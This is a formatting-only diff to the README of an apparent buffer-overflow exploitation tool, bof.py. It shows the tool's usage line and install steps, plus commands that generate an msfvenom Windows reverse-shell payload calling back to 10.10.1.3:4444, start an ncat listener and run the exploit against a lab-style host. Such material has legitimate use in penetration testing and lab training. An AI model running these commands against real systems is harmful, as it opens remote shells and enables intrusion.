@@ -6,7 +6,7 @@ Simple tool to detect and exploit buffer overflows.
 
 ## Usage
 
-usage: bof.py [-h] [-H HOST] [-p PORT] -o OFFSET [-e EIP] [-b BIN] [-s SIZE] [-sf SUFFIX] [-pf PREFIX] [-a ARCH] [-O OS] [-d] [-v]
+    usage: bof.py [-h] [-H HOST] [-p PORT] -o OFFSET [-e EIP] [-b BIN] [-s SIZE] [-sf SUFFIX] [-pf PREFIX] [-a ARCH] [-O OS] [-d] [-v]
 
 Exploit buffer overflows.
 
@@ -31,15 +31,15 @@ Exploit buffer overflows.
 Create custom shellcode and save to shellcode.py
 (must be formatted buf = b'\x90\x90\x90\x90...')
 
-  $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f python -a x86 -b "\x00\x09\x0a\x0d\xff" > shellcode.py
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f python -a x86 -b "\x00\x09\x0a\x0d\xff" > shellcode.py
 
 Listen for shell
 
-  $ ncat -lvp 4444
+    ncat -lvp 4444
 
 Run exploit
 
-  $ ./exploit.py -H 10.10.76.237 -p 31337 --sf $'\n' -o 146 -e '0x080414c3'
+    ./exploit.py -H 10.10.76.237 -p 31337 --sf $'\n' -o 146 -e '0x080414c3'
 
 Run by passing a binary and search for a JPM ESP ROP automatically
 
@@ -50,4 +50,3 @@ Run by passing a binary and search for a JPM ESP ROP automatically
     git clone git@github.com:sudoaza/bof.git
     cd bof
     pip install -r requirements.txt
-
